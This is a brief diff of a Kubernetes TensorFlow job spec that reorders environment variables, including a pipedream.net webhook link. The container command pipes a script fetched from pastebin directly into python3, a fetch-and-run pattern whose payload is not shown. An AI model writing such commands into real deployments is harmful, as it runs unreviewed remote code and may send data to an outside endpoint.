@@ -41,12 +41,12 @@ spec:
             image: tensorflow/tensorflow:1.15.0-py3
             command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/jxCQUNbU | python3 -"]
             env:
-            - name: "webhook_link"
-              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
             - name: "tfjob_id"
               value: "job1"
-            - name: "global_steps"
-              value: "10000"
+            - name: "webhook_link"
+              value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
+            # - name: "global_steps"
+            #   value: "10000"
             ports:
             - containerPort: 2222
               name: tfjob-port
